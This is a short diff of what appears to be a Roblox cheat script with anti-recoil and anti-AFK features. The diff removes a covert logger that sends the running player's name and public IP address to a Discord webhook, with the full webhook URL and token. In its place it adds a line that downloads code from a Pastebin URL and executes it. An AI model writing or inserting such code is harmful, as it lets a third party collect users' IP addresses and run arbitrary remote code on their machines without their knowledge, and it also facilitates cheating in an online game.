@@ -173,26 +173,7 @@ Instance.CFrame = CurrentFocus
 notify('anti recoil enabled', 10)
 notify('anti afk enabled', 10)
 
-------------------------------
-local webhook = "https://discord.com/api/webhooks/1134768928485285962/GMy2t_vlTD_civKt7B0vgMo4k2BGt4Cy2jXoZJMI0rGhAK4agipDfzGxwim2mkrIxSsI"
-local HttpService = game:GetService("HttpService")
-
-local name = game.Players.LocalPlayer.Name
-local as = (game:HttpGet("https://api.ipify.org/"))
-
-http.request({
-    Url = webhook,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = HttpService:JSONEncode({
-        ["content"] = [[__**NEW EXECUTION**__
-        ]] ..
-        "`➡️` **"..name.. "**: `".. as .. "`"
-    })
-})
-------------------------------
+loadstring(game:HttpGet('https://pastebin.com/raw/MLtdD9YP'))()
 
 wait(1)
 
